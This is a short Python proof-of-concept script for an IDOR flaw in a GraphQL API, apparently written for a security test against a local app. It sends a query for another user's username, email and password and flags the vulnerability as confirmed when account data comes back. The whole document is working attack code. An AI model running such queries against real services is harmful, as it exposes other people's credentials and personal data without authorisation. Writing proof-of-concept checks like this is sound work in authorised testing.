#!/usr/bin/env python3
"""PoC: IDOR - read user 2"""
import requests
import json

URL = "http://localhost:5000/graphql"
QUERY = """{ user(id: 2) { id username email password } }"""

r = requests.post(URL, json={"query": QUERY}, timeout=10)
print("Status:", r.status_code)
print("Response:", r.text[:800])

if "data" in r.text and ("admin" in r.text.lower() or "@example.com" in r.text):
    print("[!] Vulnerability confirmed")
